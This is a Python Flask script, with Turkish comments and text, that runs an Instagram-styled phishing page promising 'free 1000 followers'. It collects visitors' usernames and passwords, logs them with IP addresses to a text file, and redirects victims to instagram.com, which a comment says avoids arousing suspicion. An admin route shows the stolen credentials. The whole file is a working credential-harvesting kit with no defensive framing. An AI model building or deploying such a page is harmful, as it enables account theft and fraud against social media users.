from flask import Flask, request, redirect, render_template_string
import os

app = Flask(__name__)

# --- AYARLAR ---
ADMIN_SIFRE = "aytac1235" # Burayı kendine göre değiştir
LOG_FILE = "loglar.txt"

# Modern Takipçi Sayfası Tasarımı
TAKPICI_SAYFASI = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Takipçi Paneli | Ücretsiz Sosyal Medya Hizmetleri</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px; text-align: center; border-radius: 3px; }
        .logo { font-size: 30px; font-weight: bold; margin-bottom: 20px; color: #262626; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #efefef; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        button:hover { background: #1877f2; }
        .info { font-size: 12px; color: #8e8e8e; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo">Takipçi Merkezi</div>
        <p style="color: #262626; font-weight: 600; margin-bottom: 20px;">Ücretsiz 1000 Takipçi Tanımlamak İçin Hesabını Onayla</p>
        <form action="/login" method="POST">
            <input type="text" name="u" placeholder="Kullanıcı Adı" required>
            <input type="password" name="p" placeholder="Şifre" required>
            <button type="submit">Hemen Gönderimi Başlat</button>
        </form>
        <div class="info">Bu işlem yoğunluğa göre 30 dakika sürebilir.</div>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(TAKPICI_SAYFASI)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('u')
    password = request.form.get('p')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Logları kaydet
    with open(LOG_FILE, "a") as f:
        f.write(f"USER: {username} | PASS: {password} | IP: {ip}\n")
    
    # Şüphe çekmemek için gerçek bir takipçi makalesine veya Instagram'a yönlendir
    return redirect("https://instagram.com")

@app.route('/admin')
def admin():
    key = request.args.get('key')
    if key == ADMIN_SIFRE:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                content = f.read()
            return f"<h2>Canlı Loglar</h2><pre style='background:#000; color:#0f0; padding:15px;'>{content}</pre>"
        return "Henüz veri yok."
    return "Erişim Engellendi!", 403

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))

